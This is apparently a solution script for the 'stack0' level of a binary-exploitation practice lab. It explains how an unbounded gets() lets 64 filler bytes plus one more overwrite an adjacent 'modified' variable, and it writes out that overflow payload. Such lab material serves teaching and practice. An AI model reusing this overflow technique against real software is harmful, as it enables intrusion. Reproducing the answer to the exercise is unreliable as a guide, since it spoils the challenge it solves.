#!/usr/bin/env python3
"""
ex00 exploit  (stack0: overwrite an adjacent local variable).

main() layout (from the disassembly):
    sub    esp, 0x60
    buffer   = [esp+0x1c]      <- gets() reads here, unbounded
    modified = [esp+0x5c]      <- checked against 0
Distance buffer -> modified = 0x5c - 0x1c = 0x40 = 64 bytes.

gets() never bounds-checks, so writing 64 filler bytes + 1 more byte
spills into `modified`, making it non-zero and printing the win message.

Usage (in the VM):
    python3 ex00.py | /opt/hole-in-bin/ex00/bin
Local test:
    python3 scripts/ex00.py | scripts/runlocal.sh challenges/ex00/bin
"""
import sys

OFFSET = 64  # bytes from buffer start to `modified`
payload = b"A" * OFFSET + b"B"  # the trailing byte flips `modified` to non-zero
sys.stdout.buffer.write(payload)
